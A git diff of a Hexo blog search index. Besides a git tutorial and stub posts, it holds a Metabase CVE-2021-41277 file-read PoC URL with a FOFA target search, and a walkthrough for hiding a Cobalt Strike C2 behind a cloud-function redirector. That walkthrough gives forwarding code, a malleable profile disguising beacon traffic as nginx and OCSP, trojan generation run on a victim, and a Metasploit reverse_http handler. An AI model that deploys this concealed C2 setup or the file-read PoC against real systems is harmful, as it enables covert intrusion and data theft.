@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ddd</title>
+    <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一-、漏洞描述"><a href="#一-、漏洞描述" class="headerlink" title="一|、漏洞描述"></a>一|、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
+<h2 id="二-漏洞影响"><a href="#二-漏洞影响" class="headerlink" title="二: 漏洞影响"></a>二: 漏洞影响</h2><ul>
+<li><strong>metabase version &lt; 0.40.5</strong></li>
+<li><strong>metabase version &gt;= 1.0.0, &lt; 1.40.5</strong></li>
+</ul>
+<h3 id="1、fofa-so搜索"><a href="#1、fofa-so搜索" class="headerlink" title="1、fofa.so搜索"></a>1、fofa.so搜索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Metabase geojson&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004406584.png" alt="image-20220219004406584"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;IP&#x2F;api&#x2F;geojson?url&#x3D;file:xxxxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004247065.png" alt="image-20220219004247065"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>Metabasegeojson</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>first</title>
+    <url>/first/</url>
+    <content><![CDATA[<p>hahahaha</p>
+]]></content>
+      <tags>
+        <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git将本地代码上传到远程仓库</title>
+    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
+    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
+<p><strong>5.查看ssh是否生成，如果没有</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>
+
+<p>如果显示没有这个命令，需要配置环境变量</p>
+<pre><code>   添加git/bin的位置
+</code></pre>
+<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+<pre><code> 测试是否连接成功，
+ 出现hi 用户名  表示已成功
+</code></pre>
+<p><strong>7.设置用户名</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8.设置邮箱</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>9.上传</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2021-2394</title>
     <url>/CVE-2021-2394/</url>
     <content><![CDATA[<h1 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h2><p>​    oracle公司在2021年7月重要补丁更新报告中，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p>
@@ -67,15 +133,6 @@
       </tags>
   </entry>
   <entry>
-    <title>first</title>
-    <url>/first/</url>
-    <content><![CDATA[<p>hahahaha</p>
-]]></content>
-      <tags>
-        <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -92,38 +149,6 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>git将本地代码上传到远程仓库</title>
-    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
-    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
-<p><strong>5.查看ssh是否生成，如果没有</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>
-
-<p>如果显示没有这个命令，需要配置环境变量</p>
-<pre><code>   添加git/bin的位置
-</code></pre>
-<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-<pre><code> 测试是否连接成功，
- 出现hi 用户名  表示已成功
-</code></pre>
-<p><strong>7.设置用户名</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>8.设置邮箱</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>9.上传</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>git</tag>
-      </tags>
   </entry>
   <entry>
     <title>selenium</title>
@@ -392,6 +417,54 @@
       </tags>
   </entry>
   <entry>
+    <title>云函数和cs并派生到msf</title>
+    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
+    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
+<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
+<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
+<p>云函数内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
+<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
+<p>修改后发布即可</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
+<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
+<p><strong>可以使用80和443两个端口</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
+<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
+<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
+<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
+<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
+<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
+<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
+<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
+<p>失败emmmm</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>win10家庭版没有组策略解决方式</title>
     <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
     <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>
@@ -463,53 +536,5 @@
       <categories>
         <category>web相关</category>
       </categories>
-  </entry>
-  <entry>
-    <title>云函数和cs并派生到msf</title>
-    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
-    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
-<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
-<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
-<p>云函数内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
-<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
-<p>修改后发布即可</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
-<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
-<p><strong>可以使用80和443两个端口</strong></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
-<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server 